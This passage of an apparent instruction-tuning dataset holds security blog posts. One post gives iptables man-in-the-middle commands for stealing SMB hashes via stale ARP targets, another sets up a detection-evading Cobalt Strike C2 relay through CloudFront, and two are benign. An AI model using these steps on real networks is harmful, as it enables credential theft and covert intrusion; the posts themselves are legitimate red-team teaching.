hosts SNAC Detection Using Eavesarp Basic usage of eavesarp is discussed here All results were gathered from a reasonably small network where development took place A single host has been intentionally configured to act as a SNAC .2 targeting .101 as the stale address which is why there is at least one target that will always have a glaringly larger count of ARP requests Starting eavesarp in passive mode default while specifying the proper NIC results in a basic table being returned unveiling that sender .2 is requesting the MAC of target .101 much more frequently than any other target in the broadcast domain This is the indicator described in Stale Network Address Configurations SNACs eavesarp Passive Collection of ARP Requests Note in the image above that output is sorted by the sender generating the greatest number of ARP requests in a descending fashion as are the corresponding targets associated with that sender This is intended to facilitate quick identification of senders affected by SNACs Also observe that the records are blocked by color while printing the sender address only a single time per block making the output easier to digest by eliminating the duplicate sender values If MAC addresses are desired use the -oc --output-columns option to specify which values to display eavesarp Including MAC Addresses Basic execution of eavesarp is passive because only broadcasted ARP requests are captured and analyzed The MAC for .3 is set to UNRESOLVED above because no ARP requests from that IP has been received as a sender only a target Active checks can be configured as well which will confirm if a given configuration is stale by making an ARP request for the target observed in a broadcasted request DNS resolution can be enabled to perform reverse name resolution for both the sender and target address providing PTR record values This is useful in situations where hostnames are descriptive and may help make ARP poisoning attacks more targeted The following image shows a continuation of the previous capture with these capabilities enabled Emojis present in the stale column indicates a SNAC eavesarp Active Detection Capabilities Enabled The final column intends to communicate if the target IP is different than the forward IP associated with the target PTR which may indicate that the stale configuration is intended for the host that now owns the forward IP In this scenario it may be possible to enable IP forwarding on the attacking host assume the IP of the stale configuration and then become a man-in-the-middle for the intended host that owns the forward IP by rewriting packets at the IP TCP layer Given use of cleartext protocols between the sender and legitimate host this can result in capture modification relay of sensitive information in transit This is the premise of the section titled Services Using TCP as a Transport in the Exploiting SNACs section While this capability is only aesthetic the user can always specify a color profile to suit the current mood The author has been using the foxhound profile because he's a geek for Metal Gear Solid and it's a nice throwback to the interface used in Sons of the Patriots Starting eavesarp while selecting a valid value to pass to the --color-profile option -cp results in a change of appearance eavesarp 1337 Color Profile eavesarp Rhino Color Profile eavesarp Cupcake Color Profile The remainder of this post will now focus on the exploitation of SNACs starting with a brief overview of how to alias network interfaces with multiple IP addresses .imgur.com EcJ3MfG.gif?1 IP Aliasing Assigning additional IP addresses to a single NIC is known as IP aliasing When an ARP request for a target IP assigned to that interface static or alias the host will respond with the same MAC address It is this capability that allows us to abuse SNACs without having to poison the ARP cache of neighboring hosts When on a Debian Linux host the following commands can be executed to add or delete an IP alias to a target interface ip a add dev ip a del dev Though slightly more convoluted as always this can be applied in Windows as well by first assigning a static IP to the target interface clicking the 'Advanced Button and proceeding to add a new configuration via the 'Add button in the 'Advanced TCP IP Settings window Configuring an Alias on Windoze Exploiting SNACs This section details two potential scenarios where exploitation of SNACs is possible First a syslog configuration is targeted and represents the simplest of scenarios because the UDP transport requires no connection setup it effectively shovels free data to the aliased interface The second targets SMB and is somewhat contrived but provides a foundation for targeting TCP protocols Services Using UDP as a Transport Protocol The syslog scenario described above manifested in the environment discussed in the Contextual Babble section A misconfigured client was configured with a value that resolves to an IP address that cannot be resolved to a MAC using ARP This client was logging records in clear text that contained artifacts originating from the query string of HTTP requests processed by a web server These records just so happened to contain cleartext credentials and other sensitive information To prevent disclosure of environmental details the author created a Python script swisslogger to replicate this scenario and is available at the first URL below should the reader wish to replicate the attack for experience-building purposes swisslogger effectively simulates an easily exploitable SNAC vulnerability when configured to point to an unassigned IP address by continuously attempting to send syslog records in turn producing constant ARP requests Below are links to eavesarp and swisslogger ithub.com arch4ngel swisslog ithub.com arch4ngel eavesarp The following image shows the execution of the swisslogger while setting the IP to a stale value It simply just begins churning logs out to the address specified in the host parameter swisslogger Initiating Continuous Stream of Syslog Records The following table summarizes the hosts involved at this stage of the demonstration IP AddressRoleHostnameNotes192.168.86.2senderironThis host is vulnerable due to a stale network address configuration via swisslogger Upon execution it will begin making consistent ARP requests targeting .101 indicating a SNAC.192.168.86.5attackerdeskjetThis host will run eavesarp to detect the stale configuration applied to .2 and will be used to receive traffic from .2 after assuming the .101 address This host will respond to any ARP request for .101 after aliasing.192.168.86.101targetsyslogThis address is not in use by any host until .5 will be aliased Starting eavesarp while specifying the proper NIC reveals that sender .2 is requesting the MAC of target .101 much more frequently than any other target in the broadcast domain This is the indicator described in Stale Network Address Configurations SNACs eavesarp Passive Collection of ARP Requests Sender .2 appears to be afflicted with a SNAC and target .101 is now suspect of being an unused IP address It's possible to verify this observation by whitelisting only .101 using the --target-whitelist flag and enabling ARP resolution -ar as shown in the following image Note that column ordering is optional eavesarp Active Confirmation of Stale Target Now is the time to alias the interface It can be seen in the following images that ARP requests from sender .2 for target .101 halt after aliasing and syslog traffic generated by the swisslogger script is being received The date command was executed just before implementing the alias in the first image and the timestamp shown in tcpdump capture aligns perfectly ip .5 .101 Aliasing Network Interface with the Target Address tcpdump .5 .101 Capturing Syslog Traffic The syslog example is simple enough that it almost feels fabricated however dealing with higher layer protocols using TCP as a transport will inherently become more complex because the attacking machine will need to handle connection establishment before receiving meaningful data from the SNAC Services Using TCP as a Transport Protocol As mentioned in the SNAC detection section eavesarp also supports active ARP and DNS resolution It begins by enumerating any PTR records for senders and targets followed by performing forward resolution of recovered PTR values The following image shows execution of eavesarp while enabling ARP and DNS resolution and applying a whitelist only for the known stale target address .101 eavesarp Performing ARP and DNS Resolution for the Target Address Observing that PTR records are defined for each host we can now use the analyze subcommand and take a closer look at the stale target address The analyze command differs from the capture command by analyzing raw pcap files or SQLIte database files generated by eavesarp though it should be noted that the same analysis options are available when executed in capture mode eavesarp Analyzing Output Database to Identify MITM Opportunities eavesarp has compared the forward address to the value observed in the initial ARP request and identified dissonance as communicated in the final column This may indicate that the true target host has changed IP addresses to the forward value representing a potential MITM opportunity Note This post is about to take a sharp turn into Fiction City established in the great state of Creative Liberty It's contrived but it should provide a foundation for future work At this point let's assume that the neighboring host .102 is indeed the intended target host needed by the sender .2 but is currently unable to access it due to the SNAC Let's also assume that a network administrator Karen has noticed strange ARP behavior originating from the sender and decided to verify the configuration parameters of the syslog client However after physically walking to .2 and authenticating FICTION she'll try to access the stale target address over SMB to get additional configuration information before applying any changes For clarity the following table has been updated to reflect the additional upstream host in addition to new configurations IP AddressRoleHostnameNotes192.168.86.2sender SNAC ironThis host is vulnerable due to a stale network address configuration via swisslogger Karen will log on here and try to access an upstream SMB share for magic datas on .101 as she is unaware that the address has changed.192.168.86.101targetsyslogThis address has been aliased to the interface of .5 the attacking host.192.168.86.5attackerdeskjetThis host has been aliased with .101 and will be configured with firewall rules to support IP masquerading nat .192.168.86.102intended targetw10This is the host that originally had the .101 IP address but has since been changed to .102 resulting in a SNAC All traffic will now be forwarded to this address via firewall rules As described above we know that Karen is about to access .101 over SMB to get configuration information because she is unaware that the IP of the intended target has changed to .102 We can handle this situation by borrowing from Laurent Gaffie's work and enable IPv4 forwarding on the attacking followed by implementing firewall rules to rewrite packets to be addressed to .102 sysctl net.ipv4.conf.eth1.forwarding 1 iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE iptables -t nat -A PREROUTING --dst 192.168.86.101 -j DNAT --to-destination 192.168.86.102 Another tcpdump session is initialized prior to authenticating to .101 from .2 so that traffic can be captured and analyzed then smbclient can be used to simulate the SMB session initiated by Karen As elucidated below Karen has access to the SMB share hosted on the intended target host while mistakenly referencing the stale address identified earlier .101 smbclient .2 Karen Authenticates to the Stale IP Address tcpdump .5 .101 Capturing Traffic for Analysis Review of captured traffic using Wireshark shows that hashed credentials were captured as expected and PCredz more Laurent Gaffie wizardry can be used to dump them from the capture file for offline dictionary-based brute force attacks Wireshark Dissecting the Session Setup Request PCredz Dumping Karen's Super Strong Password Hash -laurent.blogspot.com 2016 10 introducing-responder-multirelay-10.html Conclusion Detection and exploitation of SNACs is a trivial process when operating in an environment where IP aliasing is feasible Though the proof of concept tool developed to facilitate detection is currently available only for Linux developing a tool for other operating systems should not represent a great challenge Impact stemming from exploitation of a SNAC is relative to the type of network traffic originating from the sender the simplest of which results in capture of arbitrary network traffic that may contain sensitive information Blue Recommendations Configure network infrastructure to enforce Dynamic ARP Inspection DAI a control preventing the use of aliased IP addresses and ARP poisoning attacks by assuring ARP responses are honored only when the MAC to IP binding is present in an authoritative database simplification Monitor for excessive ARP requests for a specific IP address within an unreasonable timeframe Debian hosts cache a given ARP response for 60 seconds by default This configuration can be inspected configured by interacting with the following file proc sys net ipv4 neigh default gc_stale_time Newer versions of Windows generate a value upon successful resolution but are marked stale if not used again between 15 and 45 seconds Monitor for invalid DNS records that point to abandoned IPs since clients may be configured with the friendly value resulting in SNAC Though not tested LaBrea as recommended by strandjs should prevent detection and exploitation of SNACs by tarpitting hosts that exhibit SNAC behavior"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Your Reporting Matters: How to Improve Pen Test Reporting</title>\n<taxonomies>Author, Brian King, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Brian King, macros, MSWord Tricks, Pen Test Reports, reports, screenshots</taxonomies>\n<creation_date>Mon, 29 Jul 2019 15:38:07 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian B King This is a companion post to BBKing's Hack for Show Report for Dough report given at BSides Cleveland in June 2019 The fun part of pentesting is the hacking But the part that makes it a viable career is the reporting You can develop the most amazing exploit for the most surprising vulnerability but if you can't document it clearly for the people who need to fix it then you're just having fun Which is fine Fun is awesome But if you want to get hired again your reports need to be at least as clear and useful as your hacks are awesome Guiding Principles Before getting into the details it's helpful to have a mental framework to hang them on Everything about your report should help the reader understand what you in your expert opinion found interesting about the target of your test Interesting is a word that can't usually stand by itself It's too vague Here interesting means the vulnerabilities of course but it also includes positive things If you have a go-to technique or attack that usually works but failed this time that's interesting Anything you noticed that was unusually good or consistent is interesting and should be included too Two Audiences There will be at least two kinds of people reading your report and you need to communicate clearly with both of them You'll have technical people who will need to understand how you did what you did so they can replicate your results and devise fixes that actually work Imagine writing to yourself at the skill level you had one year ago If you've been at this a long time picture an intelligent and motivated friend who does system administration or software development Someone who understands the context but maybe not the details Someone you want to help That's your technical reader Write the body of the report so that person can re-do the things you did and see the things you saw You'll also have business people who will need to understand why your findings are important and what business processes are involved either as causes or solutions Imagine a person who cares deeply about what you have to say they hired you because you're an expert after all but who focuses more on what gets done than on the details of how This person wants to keep the business running and would love it if that can be done securely They think in terms of business processes not computer systems They may not have a favorite text editor Just like your technical reader your business readers are intelligent and motivated they just work with different things one or two layers of abstraction away from the actual systems That's your business reader Write the executive summary so this person appreciates the overall situation the few most significant findings and what business processes policies or cultural norms can be brought to bear on them Facts Then Context Then Opinions i.e an argument The facts that you find are at the core of the report but they themselves are not the report Your expert judgment about those facts is also fundamental but your judgment is not the same kind of thing as a fact Your judgment is certainly valuable that's part of why you were asked to do this but it's a different kind of thing Make that difference obvious in the way you write the report Describe the facts of the situation Provide evidence to substantiate the facts Put the facts in context by showing how they affect the environment and its security Then discuss what can be done about them not what must be done about them Provide references to reputable independent sources that cover the same topic If the issue is controversial include references that take an alternate view It's OK to explain why you disagree with that view but be sure to lay out the whole story so your reader can make an informed decision about what's right for them Inform the reader with facts and references Persuade the reader with argument Make your best recommendation and then leave the final decision to them Illustrate Don't Decorate Screenshots can save a lot of typing A good screenshot can illustrate the core fact and also provide much of the needed context around it A good screenshot is accurate in that it shows a fact that is relevant to the issue at hand precise in that it shows as little else as practical sized so that any relevant text in it is readable and about the same size as the text near it in the report A bad screenshot makes the reader figure out which part of it is important is scaled so the text is unreadably small or far larger than the surrounding text makes the reader start to ignore your screenshots so that even the good ones stop helping Here's an example Can you tell what the problem is here in this uncropped screenshot with nothing to direct your attention As a general rule if your webapp screenshot includes the browser chrome think about whether you can make it more focused Like this Content Delivered Without HTTPS Now that's more clear The URL is legible The boxes and arrows force the reader to notice the interesting parts There's a caption to put it into words If you know about webapps you can't look at this and not recognize the problem You can disagree about the problem of course Maybe there's a Good Reason tm for not forcing HTTPS But this screenshot helps you know for sure what you're disagreeing about and that's the whole point MSWord Tricks Now for a few quick things that can save time and help with consistency when writing reports in Microsoft Word Instant Screenshots You can take screenshots directly in Word Put your cursor where you want the screenshot and then do Insert Screenshot Screen Clipping The MS Word window will minimize itself and the entire desktop will gray out slightly Click and drag a rectangle over what you want in the screenshot When you release the mouse button the screenshot will be in your document If you want to edit it later save it as a file first in order to get the full resolution Right-click and save as then open that file in your image editor Word started adding automatic alt text to screenshots sometime in 2019 As you might guess it's not very good at this but it can be entertaining If you're done being entertained by it you can disable it via File Options Ease of Access Automate Alt Text Uncheck that box Abusing Autocorrect The same thing that changes teh to the can be used to change any text into anything else The replacement can have formatting embedded in it Here's some possible text including formatting I just made up for an example Boilerplate Text We Don't Want To Type Again Select whatever you want as the replacement text i.e the thing you don't want to have to type again and copy it to the clipboard In this example select all three lines above and tap Ctrl-C Then open the AutoCorrect Options File Options Proofing AutoCorrect Options Notice that the contents of your clipboard are pre-filled in the replace with column Type the abbreviation you want to stand in for this Make sure it's not something you'd type as a standalone word so that it doesn't trigger unexpectedly Suggestion start these with the letter 'i for insert to avoid collisions Type Your Substitution Word Here Once this is set any time you type issl it will be replaced with what's in the second column To trigger the replacement your abbreviated text must appear as a word with whitespace both before and after it Legitimate Macros If you do a thing to blocks of text repeatedly look at recording a macro for whatever that thing is You don't have to write the macro you can set Word to record then do the steps then save the recording Then you can re-run what was recorded or you can edit the macro however you need to using the code it generated as a guide Customize the Quick Access Toolbar The Quick Access Toolbar is the left side of the title bar of any Word window By default it has Save Undo and Redo You can remove those if you don't want them and you can add anything you like here including macros Quick Access Toolbar in Red To customize this go to File Options Quick Access Toolbar Your Report Matters More than Your Hacking A test is not a thing you can deliver Nobody pays for a test A test is a series of actions that you do in the moment The thing you deliver the actual item the customer is paying for is the report Most tests fade into memory and blur quickly The report will live forever The report will drive decisions Help your reader make good decisions Make sure that everything in your report is helpful and clear Accurate and precise It matters Video Link outu.be NUueNT1svb8"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PyFunnels: Data Normalization for InfoSec Workflows</title>\n<taxonomies>General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Github, PyFunnels, Python3, TJ Nicholls, Tool Output</taxonomies>\n<creation_date>Tue, 13 Aug 2019 15:40:05 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "TJ Nicholls BHIS Guest Contributor TL DR How many times have you had to parse the same output from a tool Wouldn't you like to get that time back There is a lot of overlap in the tools we use and the workflows we perform as information security professionals Let's not reinvent the wheel every time we need to extract data from a tool PyFunnels can act as a centralized and collaborative library Enjoy the fruit of someone else's labor If the capability isn't there consider committing your Python3 code to the library in GitHub for future use Below is a quick example to get started pip install pyfunnels from PyFunnels import PyFunnels Specify the output file for each tool in a dictionary source_files spiderfoot path to file spiderfoot.db nmap path to file nmap_results.xml TheHarvester path to file theharvester-tester.xml Create a PyFunnels object PyF PyFunnels.Funnel source_files Do something with it domains PyF.funnel_data domains for d in domains pass Your use case here Currently supported tools and data points can be viewed with a method PyF PyFunnels.Funnel capabilities PyF.get_capabilities print capabilities Starting the Project As part of my Master of Science in Information Security Engineering MSISE from SANS I recently began a new project The project needed to address something in security that hasn't been solved I set a priority for myself that it would be a Python coding project because it is a skill set I needed to improve While taking a SANS course pertaining to the CIS critical controls I learned that a key success of implementing a security control is automating it This way the control lives on when you move on to new projects It is a great way to scale security and something I've been trying to incorporate into my projects With that in mind I also wanted the project to help with automation So what fits in this scope and has not been addressed This was a challenging question for me to answer I began by brainstorming tasks that I perform on a regular basis and processes that would make my life easier I put some feelers out to colleagues and went back and forth with my advisor An early idea was to figure out how to normalize indicators from incidents or cases so that pertinent data could be integrated into tools and possibly shared Through some Googling I quickly came across security incident response platforms SIRP's like theHive project This was a win and a loss Dang someone already did it Oh wow that is really cool someone already did it I then began contemplating a way to normalize the output of tools I believe it is something we as information security professionals reinvent constantly in our own workflows In other words there is a lot of overlap in the tools we use If you and I want to enumerate domains and subdomains for a net block chances are we may use at least one of the same tools during that process So my thought was why redo the work of parsing the output when it is something that has been done a hundred times over There is usually nothing particularly hard about parsing output especially if you use just one tool But we have better things to do with our day and the task starts taking more time if you use multiple tools to increase the fidelity of your findings PyFunnels Enter Pyfunnels PyFunnels is a Python3 library designed to aggregate data from tools and return a unified dataset Even though the output from tools may not be standard we can build reliable ways to retrieve the data Consider that we have one or more tools used to collect data Tools typically have output that consists of multiple data points When I say 'data points I am simply referring to things like IP addresses URLs domain names emails files login pages etc The idea is to isolate those data points The way you do that for each tool will be different but we need a unified way to get a data point from each output That is really the core of PyFunnels create and store code to isolate data The isolated data is then de-duplicated and aggregated That aggregate data can then be leveraged for whatever the use case may be Here is an animated view of what I just described Animation 1 PyFunnels Concept Example Scenario Take an example of collecting domains and subdomains using five tools overkill I know The goal is to use the output to compare discovered domains against a known inventory Once we have that information we can move on to remediation as necessary decommissioning unapproved services or adding the appropriate protections to them Ideally this is an ongoing and automated process and an alert is generated when there is a finding PyFunnels goal is to expedite the process of extracting the data Here is the process Specify the output files Figure 1 Instantiate an object Figure 1 Call a method on the object providing the data point of interest Figure 2 from PyFunnels import PyFunnels Specify the output file for each tool in a dictionary source_files spiderfoot path to file spiderfoot.db recon_ng path to file recon-ng-tester.db TheHarvester path to file theharvester-tester.xml photon path to directory photon_results nmap path to file nmap_results.xml Create a PyFunnels object PyF PyFunnels.Funnel source_files Figure 1 Example Setup PyFunnels will return the de-duplicated and aggregated data as a list Figure 2 domains PyF.funnel_data domains print domains Output 'example.com 'partner.com 'related.com for d in domains pass Your use case here Figure 2 Example Output That is it Move on with your day Put the data to work You don't need to reinvent the wheel After all you are likely not the first person to parse this data out of this output file Save time with PyFunnels and use the code you or someone else has previously committed Thought Process Lessons Learned The design of PyFunnels is modular where each tool is its own class and each data point is a method of that class The tool classes work independently of one another You don't have to build all the methods for a tool Ideally every tool would have support for every data point it collects but that can happen organically Laying out the library this way makes it easy to contribute for any level of programmer and allows PyFunnels to accommodate an unforeseen amount of tools This has been my first real coding project After I settled on the idea I just started running with it An early problem I encountered was I found myself reusing chunks of code while calling each tool I didn't know the best way to layout the classes and methods After a peer review and some research I was able to condense 147 lines of code to 12 lines This was a huge moment for me and necessary for the library to grow My lesson learned here is that if you have an idea start putting it together The code may not look great at first but you can refine and make improvements as it develops Conclusion Information security is a unique field where we do not need to compete with each other Across industries within the same industry it is in our best interest not to compete That was a big motivation for this project I wanted to find a way to collaborate and provide value to the community I believe this can become really powerful with some community adoption The concept for PyFunnels can be simplified to as you write Python3 code to isolate data from a tool commit the code so it can be reused My goal is for PyFunnels to be something useful for other professionals and for it to grow to support a large range of tools and data points If you use the library and or take a look at the code I'd love feedback Coding is new to me and I'm sure my implementation can be improved Thanks for reading I hope you find the library useful and are able to use it in your workflows The PyFunnels library can be found at ithub.com packetvitality PyFunnels ypi.org project PyFunnels The full paper I wrote as part of my MSISE can be found at ww.sans.org reading-room whitepapers OpenSource pyfunnels-data-normalization-infosec-workflows-38785 Note I've packaged the library and made modifications since I wrote the paper Refer to Github and documentation within the library for current usage examples"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Using CloudFront to Relay Cobalt Strike Traffic</title>\n<taxonomies>Author, Brian Fehrman, C2, How-To, Informational, Red Team, Red Team Tools, Brian Fehrman, CloudFront, cobalt strike, Domain Fronting</taxonomies>\n<creation_date>Thu, 15 Aug 2019 18:15:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman Many of you have likely heard of Domain Fronting Domain Fronting is a technique that can allow your C2 traffic to blend in with a target's traffic by making it appear that it is calling out to the domain owned by your target This is a great technique for red teamers to hide their traffic Amazon CloudFront was a popular service for making Domain Fronting happen Recently however changes have been made to CloudFront that no longer allow for Domain Fronting through CloudFront to work with Cobalt Strike Is all lost with CloudFront and Cobalt Strike In my opinion no CloudFront can still be extremely useful for multiple reasons No need for a categorized domain for C2 traffic Traffic blends in to a degree with CDN traffic CloudFront is whitelisted by some companies Mitigates the chances of burning your whole C2 infrastructure since your source IP is hidden Traffic will still go over HTTPS In this post I will walk you through the steps that I typically use for getting CloudFront up and going with Cobalt Strike The general steps are as follows Setup a Cobalt Strike CS server Register a domain and point it your CS server Generate an HTTPS cert for your domain Create a CloudFront distribution to point to your domain Generate a CS profile that utilizes your HTTPS cert and the CloudFront distribution Generate a CS payload to test the setup 1 Setup a Cobalt Strike CS server In this case I set up a Debian-based node on Digital Ocean I will call this your server I ran the following to get updated and setup with OpenJDK which is needed for Cobalt Strike CS apt-get update apt-get upgrade -y apt-get install -y openjdk-8-jdk-headless Grab the latest Cobalt Strike .tgz file from ww.cobaltstrike.com download and place it onto your server Unzip the .tgz enter the directory and install it with the following commands tar -xvf cobaltstrike-trial.tgz cd cobaltstrike update Note that you will need to enter your license key at this point This is all the setup that we need to do for now on CS We will do some more configuration as we go 2 Register a domain and point it to your CS server We will need to register a domain so that we can generate an HTTPS certificate CloudFront requires that you have a valid domain with an HTTPS cert that is pointed at a server that is running something like Apache so that it can verify that the certificate is valid The domain does not need to be categorized which makes things easy I like to use ww.namesilo.com but you are free to use whatever registrar that you prefer In this case I just searched for bhisblogtest and picked the cheapest extension which was bhisblogtest.xyz for 0.99 for the year Searching for a Domain One of the reasons that I like namesilo.com is that you get free WHOIS Privacy some companies charge for this Plus it doesn't tack on additional ICANN fees WHOIS Privacy Included for Free by namesilo.com After you register the domain use namesilo.com to update the DNS records I typically delete the default records that it creates After deleting the default DNS records create a single A-Record that points to your server In this case my server's IP was 159.65.46.217 NOTE For those of you that are getting some urges right now I wouldn't suggest attacking it as it was burned before this was posted and likely belongs to somebody else if it is currently live Searching for a Domain Wait until the DNS records propagate before moving onto the next step In my experience this will typically take about 10-15 minutes Run your favorite DNS lookup tool on the domain that you registered and wait until the IP address returned matches the IP address of your server In this case we run the following until we see 159.65.46.217 returned nslookup bhisblogtest.xyz DNS Record has Propagated Note Debian doesn't always have DNS tools installed you might need to run the following command first if you can't use nslookup dig etc apt-get install -y dnsutils 3 Generate an HTTPS certificate for your domain In the old days you had to pay money for valid certificates that were signed by a respected Certificate Authority Nowadays we can generate them quickly and freely by using LetsEncrypt In particular we will use the HTTPsC2DoneRight.sh script from KillSwitch-GUI Before we can use the HTTPsC2DoneRight.sh script we need to install a few prerequisites Run the following commands on your server assuming Debian to install the prerequisites apt-get install -y git lsof Next make sure you are in your root directory grab the HTTPsC2DoneRight.sh script enable execution and run it cd wget aw.githubusercontent.com killswitch-GUI CobaltStrike-ToolKit master HTTPsC2DoneRight.sh chmod x HTTPsC2DoneRight.sh HTTPsC2DoneRight.sh Once the script runs you will need to enter your domain name that you registered a password for the HTTPs certificate and the location of your cobaltstrike folder Running HTTPsC2DoneRight.sh If all goes well you should have an Amazon-based CS profile named amazon.profile in a folder named httpsProfile that is within your cobaltstrike folder The Java Keystore associated with your HTTPS certificate will also be in the httpsProfile folder Output from HTTPsC2DoneRight.sh If you run the command tail on amazon.profile you will see information associated with your HTTPS certificate in the CS profile We will actually be generating a new CS profile later but will need the four lines at the end of amazon.profile for that profile The tail of amazon.profile from HTTPsC2DoneRight.sh Showing Certificate Information Needed for CS Profile At this point you should be able to open a web browser head to https and see the default Apache page without any certificate errors If the aforementioned doesn't happen then something has gone wrong somewhere in the process and the remaining steps likely won't succeed Verifying HTTPS Certificate was Correctly Generated 4 Create a CloudFront distribution to point to your domain The next step is to create a CloudFront distribution and point it your domain The following is the article that I originally used and still reference to get the settings correct edium.com rvrsh3ll ssl-domain-fronting-101-4348d410c56f Head to onsole.aws.amazon.com cloudfront home and login or create an account if you don't have one already it's free Click on Create Distribution at the top of the page Create CloudFront Distribution Click on Get Started under the Web section of the page Choosing Get Started under Web Section Enter in your domain name for the Origin Domain Name field The Origin ID field will automatically be populated for you Make sure that the remaining settings match the following screenshots First Section of CloudFront Distribution Settings Second Set of CloudFront Distribution Settings The remaining settings that are not included in the screenshots above do not need to be altered Scroll to the bottom of the page and click the Create Distribution button Click Create Distribution after Updating CloudFront Settings You will be taken back to the CloudFront main menu and you should see a cloudfront.net address that is associated with your domain The CloudFront address will be what we use to refer to our server from now on You should see In Progress under the Status column Wait until In Progress has changed to Deployed before proceeding You may need to refresh the page a few times as this could take 10 or 15 minutes CloudFront Distribution Address Deploying After your distribution has been deployed test that it is working by visiting https and verify that you see the Apache2 default page without any certificate errors Verifying CloudFront Distribution is Deployed 5 Generate a CS profile that utilizes your HTTPS cert and the CloudFront distribution We will now generate a CS profile to take advantage of our CloudFront distribution Since most default CS profiles get flagged we will take the time here to generate a new one On your server head back to the home directory and grab the Malleable-C2-Randomizer script by bluescreenofjeff cd git clone ithub.com bluscreenofjeff Malleable-C2-Randomizer cd Malleable-C2-Randomizer The next step is to generate a random CS profile I've found that the Pandora.profile template provides the fewest issues with this technique Run the following command to generate a profile python malleable-c2-randomizer.py -profile Sample Templates Pandora.profile -notest We need to copy the profile that was created to the httpsProfile folder in our cobaltstrike folder The screenshot below shows an example of the output from the Malleable-C2-Randomizer script and copying that file to the httpsProfile folder Copying Malleable-C2-Randomizer Output-File to root cobaltstrike httpsProfile Head into the httpsProfile folder so that we can modify our newly-created CS profile cd root cobaltstrike httpsProfile Remember when we did a tail on the amazon.profile file and saw the four lines that started with https-certificate We need to grab those four lines and place them at the bottom of our new CS Pandora-profile Run the command tail again on amazon.profile and copy the last four lines the https-certificate section Copy Last Four Lines of amazon.profile Open the newly-created Pandora profile in the text editor of your choice Paste the four lines that you just copied to the bottom of the Pandora profile Pasting Certificate Information into Pandora Profile For good OpSec we should change the default process to which our payload will spawn Add the following lines to the end of your Pandora profile file underneath of the https-certificate section that you added post-ex set spawnto_x86 windir syswow64 mstsc.exe set spawnto_x64 windir sysnative mstsc.exe Code Added to Pandora Profile to Change SpawnTo Process The last thing that we need to modify in our Pandora profile is the host to which our payload will beacon There are two places in the profile where the host needs to be changed Find both locations in the Pandora profile where Host is mentioned and change the address to point to your cloudfront.net address that was generated as part of your CloudFront distribution One Location of Host Value in Pandora Profile Other Location of Host Value in Pandora Profile Kill the apache2 service on your server since it will conflict with the CS Listener that we will create in the final step Run the following command on your server service apache2 stop We are now ready to launch our CS Team Server with the new profile Move up a directory so that you are in the cobaltstrike directory which is root cobaltstrike in this case Run the CS Team Server with the following template for a command teamserver Running CS Team Server with Custom Pandora Profile The CS Team Server should now be up and running and we can move onto the final steps 6 Generate a CS payload to test the setup The final step is to start a CS Listener and generate a CS payload This step assumes you have installed the CS client on a system Open the CS client and connect to your CS Team Server Connecting to CS Team Server Choose the option in the CS client to add a new listener Name the listener anything that you would like which is rhttps in this example Select the windows beacon_https reverse_https payload in the drop-down menu In the Host field enter the address of your CloudFront distribution that you created earlier Enter 443 in the Port field and then click save Settings for CS Listener An additional popup screen will be shown that asks you to enter a domain to use for beaconing Enter your CloudFront distribution address as the domain for beaconing and click the Ok button CloudFront Address Used as Beaconing Domain You should now have a CS Listener up and running that is taking advantage of all of the work that has been done up to this point The last step is to generate a payload to test that everything is working I will state at this point that any CS Payload that you generate and attempt to use without additional steps will almost certainly be caught by AV engines Generating a payload that does not get caught by AV is enough material for another blog post The gist of it is that you typically generate CS Shellcode and use a method to inject that shellcode into memory We will not dive into those details in this blog post as the focus on this post is how to use CloudFront as a relay for CS For our purposes here disable all of the AV that you have on the Windows system on which you will run the payload Select the HTML Application payload from the menu shown in the screenshot below Selecting HTML Application as CS Payload Format Make sure that the Listener drop-down menu matches the name that you gave to your listener which is rhttps in this case Choose Executable from the Method drop-down menu Click the Generate button choose a location to save the payload and then run the payload by double-clicking on the file that was generated You should observe in your CS-client window that a session has been established Choosing Payload Listener and Method Session Established Protections Preventing attackers from using CloudFront as a relay in your environment is unfortunately not as easy as just disallowing access to CloudFront Disallowing access to CloudFront would likely break a portion of the internet for your company since many websites rely on CloudFront To help mitigate the chances of an attacker establishing a C2 channel that uses CloudFront as a relay we would suggest a strong application-whitelisting policy to prevent users from running malicious payloads in the first place Conclusion Using CloudFront as a relay for your C2 server has many benefits that can allow you to bypass multiple protections within an environment and hide the origin of your C2 server This article walked through all the steps that should be needed to set up a CloudFront distribution to use as a relay for a Cobalt Strike Team Server Generating CS payloads that evade AV will be discussed in future posts"
    },
    {
        "input": "",
